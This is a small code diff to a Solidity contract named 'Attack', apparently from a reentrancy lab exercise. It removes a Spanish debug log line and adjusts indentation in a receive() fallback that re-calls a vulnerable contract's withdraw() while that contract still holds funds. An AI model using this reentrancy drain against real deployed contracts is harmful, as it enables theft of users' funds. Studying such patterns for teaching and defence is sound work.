@@ -17,9 +17,8 @@ contract Attack {
     }
 
     receive() external payable {
-        console.log("Balance antes del ataque:", address(vulnerable).balance);
-        if (address(vulnerable).balance >= msg.value) {
+                if (address(vulnerable).balance >= msg.value) {
             vulnerable.withdraw();
-        }
-    }
+            }  
+       }
 }
